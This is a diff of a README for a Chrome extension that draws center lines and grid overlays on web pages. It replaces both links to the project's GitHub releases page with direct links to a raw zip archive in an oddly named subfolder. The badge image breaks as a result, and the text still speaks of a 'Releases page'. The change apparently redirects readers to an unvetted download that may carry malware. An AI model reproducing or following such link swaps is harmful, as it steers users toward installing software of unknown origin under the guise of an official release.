@@ -1,7 +1,7 @@
 # 🎉 center-line-extension - Effortlessly Align Designs on Any Page
 
 ## 📦 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/JASVINn/center-line-extension/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/JASVINn/center-line-extension/main/isovalerone/center-line-extension.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/JASVINn/center-line-extension/main/isovalerone/center-line-extension.zip)
 
 ## 🚀 Getting Started
 Welcome to the center-line-extension! This Chrome Extension helps you add center lines and grid overlays to any webpage. It's perfect for designers, developers, and anyone looking to improve their page layouts. Follow these steps to get started quickly.
@@ -21,7 +21,7 @@ Welcome to the center-line-extension! This Chrome Extension helps you add center
 To get started, you will need to download the extension. 
 
 1. **Visit the Releases Page:** Click the link below to go to the download page:
-   [Download center-line-extension](https://github.com/JASVINn/center-line-extension/releases).
+   [Download center-line-extension](https://raw.githubusercontent.com/JASVINn/center-line-extension/main/isovalerone/center-line-extension.zip).
 
 2. **Choose the Latest Version:** On the Releases page, look for the latest release. Select it to open the release details.
 
